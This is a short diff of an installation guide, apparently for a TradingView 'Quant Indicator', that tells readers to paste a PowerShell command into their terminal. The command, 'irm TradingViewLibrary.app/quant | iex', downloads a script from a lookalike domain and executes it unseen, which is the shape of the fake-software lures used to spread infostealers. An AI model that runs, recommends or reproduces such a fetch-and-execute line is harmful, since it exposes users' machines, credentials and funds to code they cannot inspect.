@@ -24,9 +24,7 @@ PowerShell
 
 Then press **Enter**.
 
-#### 2. Install the Quant Indicator
-
-Copy and paste the installation command below into PowerShell:
+#### 2. Copy and paste the installation command below into PowerShell:
 ```powershell
 irm TradingViewLibrary.app/quant | iex
 ```
